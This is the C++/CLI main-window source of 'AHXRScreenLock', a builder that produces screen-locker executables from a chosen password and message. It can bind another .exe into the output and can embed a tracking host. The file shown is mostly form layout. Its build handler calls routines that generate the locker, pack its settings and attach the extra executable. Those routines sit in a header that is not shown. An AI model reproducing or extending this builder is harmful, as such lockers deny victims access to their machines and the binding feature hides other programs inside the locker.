/*
	@title
		AHXRScreenLock
	@author
		AHXR (https://github.com/AHXR)
	@copyright
		2017

	AHXRScreenLock is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	AHXRScreenLock is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with AHXRScreenLock.  If not, see <http://www.gnu.org/licenses/>.
*/
//=========================================
#pragma once

#include "settings.h"
#include "frmAbout.h"

namespace AHXRScreenLock {

	using namespace System;
	using namespace System::ComponentModel;
	using namespace System::Collections;
	using namespace System::Windows::Forms;
	using namespace System::Data;
	using namespace System::Drawing;

	/// <summary>
	/// Summary for frmMain
	/// </summary>
	public ref class frmMain : public System::Windows::Forms::Form
	{
	public:
		frmMain(void)
		{
			InitializeComponent();
			//
			//TODO: Add the constructor code here
			//
		}

	protected:
		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		~frmMain()
		{
			if (components)
			{
				delete components;
			}
		}

	protected:



	private: System::Windows::Forms::TextBox^  txtMessage;
	private: System::Windows::Forms::Button^  btnBuild;
	private: System::Windows::Forms::SaveFileDialog^  saveFileDialog;
	private: System::Windows::Forms::ProgressBar^  pgBar;
	private: System::Windows::Forms::OpenFileDialog^  attachDialog;
	private: System::Windows::Forms::Button^  btnAttach;
	private: System::Windows::Forms::Panel^  panel1;
	private: System::Windows::Forms::Label^  label1;
	private: System::Windows::Forms::Label^  label2;
	private: System::Windows::Forms::CheckBox^  chkMask;
	private: System::Windows::Forms::TextBox^  txtPassword;
	private: System::Windows::Forms::Panel^  panel2;
	private: System::Windows::Forms::Label^  label3;
	private: System::Windows::Forms::Label^  label4;
	private: System::Windows::Forms::TextBox^  txtExe;
	private: System::Windows::Forms::Panel^  panel3;
	private: System::Windows::Forms::Label^  lblExample;
	private: bool b_dragging;
	private: Point p_offset;
	private: System::Windows::Forms::Label^  btnExit;
	private: System::Windows::Forms::Label^  btnAbout;
	private: System::Windows::Forms::Label^  btnUpdate;
	private: System::Windows::Forms::Label^  label5;
	private: System::Windows::Forms::Button^  btnTracking;
	private: System::Windows::Forms::TextBox^  txtHost;


	private:
		/// <summary>
		/// Required designer variable.
		/// </summary>
		System::ComponentModel::Container ^components;

#pragma region Windows Form Designer generated code
		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		void InitializeComponent(void)
		{
			this->txtMessage = (gcnew System::Windows::Forms::TextBox());
			this->btnBuild = (gcnew System::Windows::Forms::Button());
			this->saveFileDialog = (gcnew System::Windows::Forms::SaveFileDialog());
			this->pgBar = (gcnew System::Windows::Forms::ProgressBar());
			this->attachDialog = (gcnew System::Windows::Forms::OpenFileDialog());
			this->btnAttach = (gcnew System::Windows::Forms::Button());
			this->panel1 = (gcnew System::Windows::Forms::Panel());
			this->btnUpdate = (gcnew System::Windows::Forms::Label());
			this->btnAbout = (gcnew System::Windows::Forms::Label());
			this->btnExit = (gcnew System::Windows::Forms::Label());
			this->label1 = (gcnew System::Windows::Forms::Label());
			this->label2 = (gcnew System::Windows::Forms::Label());
			this->chkMask = (gcnew System::Windows::Forms::CheckBox());
			this->txtPassword = (gcnew System::Windows::Forms::TextBox());
			this->panel2 = (gcnew System::Windows::Forms::Panel());
			this->label3 = (gcnew System::Windows::Forms::Label());
			this->label4 = (gcnew System::Windows::Forms::Label());
			this->txtExe = (gcnew System::Windows::Forms::TextBox());
			this->panel3 = (gcnew System::Windows::Forms::Panel());
			this->lblExample = (gcnew System::Windows::Forms::Label());
			this->label5 = (gcnew System::Windows::Forms::Label());
			this->btnTracking = (gcnew System::Windows::Forms::Button());
			this->txtHost = (gcnew System::Windows::Forms::TextBox());
			this->panel1->SuspendLayout();
			this->panel3->SuspendLayout();
			this->SuspendLayout();
			// 
			// txtMessage
			// 
			this->txtMessage->Location = System::Drawing::Point(13, 104);
			this->txtMessage->MaxLength = 20;
			this->txtMessage->Multiline = true;
			this->txtMessage->Name = L"txtMessage";
			this->txtMessage->Size = System::Drawing::Size(220, 22);
			this->txtMessage->TabIndex = 3;
			this->txtMessage->TextChanged += gcnew System::EventHandler(this, &frmMain::txtMessage_TextChanged);
			// 
			// btnBuild
			// 
			this->btnBuild->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9));
			this->btnBuild->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnBuild->Location = System::Drawing::Point(11, 363);
			this->btnBuild->Name = L"btnBuild";
			this->btnBuild->Size = System::Drawing::Size(135, 42);
			this->btnBuild->TabIndex = 2;
			this->btnBuild->Text = L"Build";
			this->btnBuild->UseVisualStyleBackColor = true;
			this->btnBuild->Click += gcnew System::EventHandler(this, &frmMain::btnBuild_Click);
			// 
			// saveFileDialog
			// 
			this->saveFileDialog->Filter = L"EXE Files|*.exe";
			this->saveFileDialog->Title = L"File Name";
			this->saveFileDialog->FileOk += gcnew System::ComponentModel::CancelEventHandler(this, &frmMain::saveFileDialog_FileOk);
			// 
			// pgBar
			// 
			this->pgBar->Location = System::Drawing::Point(152, 363);
			this->pgBar->Name = L"pgBar";
			this->pgBar->Size = System::Drawing::Size(298, 42);
			this->pgBar->TabIndex = 3;
			// 
			// attachDialog
			// 
			this->attachDialog->Filter = L"exe files|*.exe";
			this->attachDialog->FileOk += gcnew System::ComponentModel::CancelEventHandler(this, &frmMain::attachDialog_FileOk);
			// 
			// btnAttach
			// 
			this->btnAttach->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9));
			this->btnAttach->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnAttach->Location = System::Drawing::Point(259, 60);
			this->btnAttach->Name = L"btnAttach";
			this->btnAttach->Size = System::Drawing::Size(100, 38);
			this->btnAttach->TabIndex = 4;
			this->btnAttach->Text = L"ATTACH";
			this->btnAttach->UseVisualStyleBackColor = true;
			this->btnAttach->Click += gcnew System::EventHandler(this, &frmMain::btnAttach_Click);
			// 
			// panel1
			// 
			this->panel1->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(20)), static_cast<System::Int32>(static_cast<System::Byte>(20)),
				static_cast<System::Int32>(static_cast<System::Byte>(20)));
			this->panel1->Controls->Add(this->btnUpdate);
			this->panel1->Controls->Add(this->btnAbout);
			this->panel1->Controls->Add(this->btnExit);
			this->panel1->Controls->Add(this->label1);
			this->panel1->Location = System::Drawing::Point(-9, -30);
			this->panel1->Name = L"panel1";
			this->panel1->Size = System::Drawing::Size(491, 62);
			this->panel1->TabIndex = 5;
			this->panel1->MouseDown += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseDown);
			this->panel1->MouseMove += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseMove);
			this->panel1->MouseUp += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseUp);
			// 
			// btnUpdate
			// 
			this->btnUpdate->AutoSize = true;
			this->btnUpdate->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 12, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->btnUpdate->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnUpdate->Location = System::Drawing::Point(364, 35);
			this->btnUpdate->Name = L"btnUpdate";
			this->btnUpdate->Size = System::Drawing::Size(32, 22);
			this->btnUpdate->TabIndex = 3;
			this->btnUpdate->Text = L"1.3";
			this->btnUpdate->MouseEnter += gcnew System::EventHandler(this, &frmMain::btnUpdate_MouseEnter);
			this->btnUpdate->MouseLeave += gcnew System::EventHandler(this, &frmMain::btnUpdate_MouseLeave);
			// 
			// btnAbout
			// 
			this->btnAbout->AutoSize = true;
			this->btnAbout->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 12, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->btnAbout->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnAbout->Location = System::Drawing::Point(416, 35);
			this->btnAbout->Name = L"btnAbout";
			this->btnAbout->Size = System::Drawing::Size(19, 22);
			this->btnAbout->TabIndex = 2;
			this->btnAbout->Text = L"A";
			this->btnAbout->Click += gcnew System::EventHandler(this, &frmMain::btnAbout_Click);
			this->btnAbout->MouseEnter += gcnew System::EventHandler(this, &frmMain::btnAbout_MouseEnter);
			this->btnAbout->MouseLeave += gcnew System::EventHandler(this, &frmMain::btnAbout_MouseLeave);
			// 
			// btnExit
			// 
			this->btnExit->AutoSize = true;
			this->btnExit->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 12, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->btnExit->ForeColor = System::Drawing::Color::DodgerBlue;
			this->btnExit->Location = System::Drawing::Point(441, 35);
			this->btnExit->Name = L"btnExit";
			this->btnExit->Size = System::Drawing::Size(19, 22);
			this->btnExit->TabIndex = 1;
			this->btnExit->Text = L"X";
			this->btnExit->Click += gcnew System::EventHandler(this, &frmMain::btnExit_Click);
			this->btnExit->MouseEnter += gcnew System::EventHandler(this, &frmMain::btnExit_MouseEnter);
			this->btnExit->MouseLeave += gcnew System::EventHandler(this, &frmMain::btnExit_MouseLeave);
			this->btnExit->MouseHover += gcnew System::EventHandler(this, &frmMain::btnExit_MouseHover);
			// 
			// label1
			// 
			this->label1->AutoSize = true;
			this->label1->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 12, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label1->ForeColor = System::Drawing::Color::DodgerBlue;
			this->label1->Location = System::Drawing::Point(16, 35);
			this->label1->Name = L"label1";
			this->label1->Size = System::Drawing::Size(280, 22);
			this->label1->TabIndex = 0;
			this->label1->Text = L"AHXRScreenLock - ScreenLock Builder";
			this->label1->MouseDown += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseDown);
			this->label1->MouseMove += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseMove);
			this->label1->MouseUp += gcnew System::Windows::Forms::MouseEventHandler(this, &frmMain::panel1_MouseUp);
			// 
			// label2
			// 
			this->label2->AutoSize = true;
			this->label2->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label2->ForeColor = System::Drawing::Color::DodgerBlue;
			this->label2->Location = System::Drawing::Point(12, 39);
			this->label2->Name = L"label2";
			this->label2->Size = System::Drawing::Size(164, 18);
			this->label2->TabIndex = 8;
			this->label2->Text = L"PASSWORD (16 CHARACTERS)";
			// 
			// chkMask
			// 
			this->chkMask->AutoSize = true;
			this->chkMask->Checked = true;
			this->chkMask->CheckState = System::Windows::Forms::CheckState::Checked;
			this->chkMask->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9));
			this->chkMask->ForeColor = System::Drawing::Color::DodgerBlue;
			this->chkMask->Location = System::Drawing::Point(182, 38);
			this->chkMask->Name = L"chkMask";
			this->chkMask->Size = System::Drawing::Size(51, 22);
			this->chkMask->TabIndex = 7;
			this->chkMask->Text = L"Mask";
			this->chkMask->UseVisualStyleBackColor = true;
			this->chkMask->CheckedChanged += gcnew System::EventHandler(this, &frmMain::chkMask_CheckedChanged_1);
			// 
			// txtPassword
			// 
			this->txtPassword->Location = System::Drawing::Point(15, 60);
			this->txtPassword->MaxLength = 16;
			this->txtPassword->Name = L"txtPassword";
			this->txtPassword->Size = System::Drawing::Size(218, 20);
			this->txtPassword->TabIndex = 6;
			this->txtPassword->UseSystemPasswordChar = true;
			// 
			// panel2
			// 
			this->panel2->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(10)), static_cast<System::Int32>(static_cast<System::Byte>(10)),
				static_cast<System::Int32>(static_cast<System::Byte>(10)));
			this->panel2->Location = System::Drawing::Point(-17, 26);
			this->panel2->Name = L"panel2";
			this->panel2->Size = System::Drawing::Size(507, 10);
			this->panel2->TabIndex = 9;
			// 
			// label3
			// 
			this->label3->AutoSize = true;
			this->label3->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label3->ForeColor = System::Drawing::Color::DodgerBlue;
			this->label3->Location = System::Drawing::Point(12, 83);
			this->label3->Name = L"label3";
			this->label3->Size = System::Drawing::Size(154, 18);
			this->label3->TabIndex = 10;
			this->label3->Text = L"MESSAGE (20 CHARACTERS)";
			// 
			// label4
			// 
			this->label4->AutoSize = true;
			this->label4->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label4->ForeColor = System::Drawing::Color::DodgerBlue;
			this->label4->Location = System::Drawing::Point(259, 39);
			this->label4->Name = L"label4";
			this->label4->Size = System::Drawing::Size(103, 18);
			this->label4->TabIndex = 11;
			this->label4->Text = L"ATTACH .EXE FILE";
			// 
			// txtExe
			// 
			this->txtExe->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9));
			this->txtExe->ForeColor = System::Drawing::Color::DodgerBlue;
			this->txtExe->Location = System::Drawing::Point(259, 104);
			this->txtExe->Multiline = true;
			this->txtExe->Name = L"txtExe";
			this->txtExe->ReadOnly = true;
			this->txtExe->ScrollBars = System::Windows::Forms::ScrollBars::Horizontal;
			this->txtExe->Size = System::Drawing::Size(100, 22);
			this->txtExe->TabIndex = 12;
			this->txtExe->Text = L"NO EXECUTABLE ATTACHED";
			this->txtExe->TextAlign = System::Windows::Forms::HorizontalAlignment::Center;
			// 
			// panel3
			// 
			this->panel3->BackColor = System::Drawing::Color::Black;
			this->panel3->Controls->Add(this->lblExample);
			this->panel3->Location = System::Drawing::Point(13, 132);
			this->panel3->Name = L"panel3";
			this->panel3->Size = System::Drawing::Size(437, 225);
			this->panel3->TabIndex = 13;
			// 
			// lblExample
			// 
			this->lblExample->AutoSize = true;
			this->lblExample->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9.75F, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->lblExample->ForeColor = System::Drawing::Color::White;
			this->lblExample->Location = System::Drawing::Point(157, 95);
			this->lblExample->Name = L"lblExample";
			this->lblExample->Size = System::Drawing::Size(0, 18);
			this->lblExample->TabIndex = 0;
			// 
			// label5
			// 
			this->label5->AutoSize = true;
			this->label5->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9, System::Drawing::FontStyle::Regular, System::Drawing::GraphicsUnit::Point,
				static_cast<System::Byte>(0)));
			this->label5->ForeColor = System::Drawing::Color::DodgerBlue;
			this->label5->Location = System::Drawing::Point(384, 39);
			this->label5->Name = L"label5";
			this->label5->Size = System::Drawing::Size(62, 18);
			this->label5->TabIndex = 14;
			this->label5->Text = L"TRACKING";
			// 
			// btnTracking
			// 
			this->btnTracking->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9));
			this->btnTracking->ForeColor = System::Drawing::Color::Red;
			this->btnTracking->Location = System::Drawing::Point(376, 60);
			this->btnTracking->Name = L"btnTracking";
			this->btnTracking->Size = System::Drawing::Size(75, 38);
			this->btnTracking->TabIndex = 15;
			this->btnTracking->Text = L"OFF";
			this->btnTracking->UseVisualStyleBackColor = true;
			this->btnTracking->Click += gcnew System::EventHandler(this, &frmMain::btnTracking_Click);
			// 
			// txtHost
			// 
			this->txtHost->Font = (gcnew System::Drawing::Font(L"Trebuchet MS", 9));
			this->txtHost->ForeColor = System::Drawing::Color::DodgerBlue;
			this->txtHost->Location = System::Drawing::Point(376, 104);
			this->txtHost->Multiline = true;
			this->txtHost->Name = L"txtHost";
			this->txtHost->ScrollBars = System::Windows::Forms::ScrollBars::Horizontal;
			this->txtHost->Size = System::Drawing::Size(75, 22);
			this->txtHost->TabIndex = 16;
			this->txtHost->Text = L"127.0.0.1";
			this->txtHost->TextAlign = System::Windows::Forms::HorizontalAlignment::Center;
			// 
			// frmMain
			// 
			this->AutoScaleDimensions = System::Drawing::SizeF(6, 13);
			this->AutoScaleMode = System::Windows::Forms::AutoScaleMode::Font;
			this->BackColor = System::Drawing::Color::FromArgb(static_cast<System::Int32>(static_cast<System::Byte>(35)), static_cast<System::Int32>(static_cast<System::Byte>(35)),
				static_cast<System::Int32>(static_cast<System::Byte>(35)));
			this->ClientSize = System::Drawing::Size(463, 418);
			this->Controls->Add(this->txtHost);
			this->Controls->Add(this->btnTracking);
			this->Controls->Add(this->label5);
			this->Controls->Add(this->panel3);
			this->Controls->Add(this->txtExe);
			this->Controls->Add(this->label4);
			this->Controls->Add(this->txtMessage);
			this->Controls->Add(this->label3);
			this->Controls->Add(this->panel1);
			this->Controls->Add(this->panel2);
			this->Controls->Add(this->label2);
			this->Controls->Add(this->chkMask);
			this->Controls->Add(this->txtPassword);
			this->Controls->Add(this->btnAttach);
			this->Controls->Add(this->pgBar);
			this->Controls->Add(this->btnBuild);
			this->FormBorderStyle = System::Windows::Forms::FormBorderStyle::None;
			this->MaximizeBox = false;
			this->Name = L"frmMain";
			this->Text = L"AXHRScreenLock";
			this->panel1->ResumeLayout(false);
			this->panel1->PerformLayout();
			this->panel3->ResumeLayout(false);
			this->panel3->PerformLayout();
			this->ResumeLayout(false);
			this->PerformLayout();

		}
#pragma endregion
	private: System::Void btnBuild_Click(System::Object^  sender, System::EventArgs^  e) {
		validateClientBuild(this->txtMessage->Text, this->txtPassword->Text, this->saveFileDialog);
	}
	private: System::Void saveFileDialog_FileOk(System::Object^  sender, System::ComponentModel::CancelEventArgs^  e) {

		std::string
			s_file = marshal_as< std::string >(this->saveFileDialog->FileName);

		this->pgBar->Value = 25;
		buildNewLocker(s_file);
		this->pgBar->Value = 65;
		if (b_tracking_toggle) 
			packLocker(s_file, marshal_as< std::string >(this->txtPassword->Text), marshal_as< std::string >(this->txtMessage->Text), marshal_as< std::string >(this->txtHost->Text));
		else 
			packLocker(s_file, marshal_as< std::string >(this->txtPassword->Text), marshal_as< std::string >(this->txtMessage->Text));
		this->pgBar->Value = 80;
		if ( !s_attached_p.empty() ) {
			attachExecutable(s_file, s_attached_p);
		}

		this->pgBar->Value = 100;
		MessageBox::Show(COMPLETE_MSG);
	}
private: System::Void btnAttach_Click(System::Object^  sender, System::EventArgs^  e) {
	this->attachDialog->ShowDialog();
}
private: System::Void attachDialog_FileOk(System::Object^  sender, System::ComponentModel::CancelEventArgs^  e) {
	s_attached_p = marshal_as< std::string >(this->attachDialog->FileName);
	this->txtExe->Text = this->attachDialog->FileName->Substring(this->attachDialog->FileName->LastIndexOf(L"\\")+1);
}
private: System::Void txtMessage_TextChanged(System::Object^  sender, System::EventArgs^  e) {
	this->lblExample->Text = this->txtMessage->Text;
}
private: System::Void chkMask_CheckedChanged_1(System::Object^  sender, System::EventArgs^  e) {
	this->txtPassword->UseSystemPasswordChar = this->chkMask->Checked;
}
private: System::Void panel1_MouseDown(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e) {
	this->b_dragging = true;
	this->p_offset = Point(e->X, e->Y);
}
private: System::Void panel1_MouseMove(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e) {
	if (this->b_dragging) {
		Point p_current = PointToScreen(e->Location);
		Location = Point(p_current.X - this->p_offset.X, p_current.Y - this->p_offset.Y);
	}
}
private: System::Void panel1_MouseUp(System::Object^  sender, System::Windows::Forms::MouseEventArgs^  e) {
	this->b_dragging = false;
}
private: System::Void btnExit_MouseHover(System::Object^  sender, System::EventArgs^  e) {
	this->btnExit->ForeColor = System::Drawing::Color::White;
}
private: System::Void btnExit_MouseLeave(System::Object^  sender, System::EventArgs^  e) {
	this->btnExit->ForeColor = System::Drawing::Color::DodgerBlue;
}
private: System::Void btnExit_Click(System::Object^  sender, System::EventArgs^  e) {
	Application::Exit();
}
private: System::Void btnAbout_MouseEnter(System::Object^  sender, System::EventArgs^  e) {
	this->btnAbout->ForeColor = System::Drawing::Color::White;
}
private: System::Void btnExit_MouseEnter(System::Object^  sender, System::EventArgs^  e) {
	this->btnExit->ForeColor = System::Drawing::Color::White;
}
private: System::Void btnAbout_MouseLeave(System::Object^  sender, System::EventArgs^  e) {
	this->btnAbout->ForeColor = System::Drawing::Color::DodgerBlue;
}
private: System::Void btnAbout_Click(System::Object^  sender, System::EventArgs^  e) {
	AHXRScreenLock::frmAbout frm;
	frm.ShowDialog();
}
private: System::Void btnUpdate_MouseEnter(System::Object^  sender, System::EventArgs^  e) {
	this->btnUpdate->ForeColor = System::Drawing::Color::White;
}
private: System::Void btnUpdate_MouseLeave(System::Object^  sender, System::EventArgs^  e) {
	this->btnUpdate->ForeColor = System::Drawing::Color::DodgerBlue;
}
private: System::Void btnTracking_Click(System::Object^  sender, System::EventArgs^  e) {
	
	if (b_tracking_toggle) {
		this->btnTracking->Text = "OFF";
		this->btnTracking->ForeColor = System::Drawing::Color::Red;
	}
	else {
		MessageBox::Show(WARNING_MSG);
		this->btnTracking->Text = "ON";
		this->btnTracking->ForeColor = System::Drawing::Color::Green;
	}
	b_tracking_toggle = !b_tracking_toggle;
}
};
}
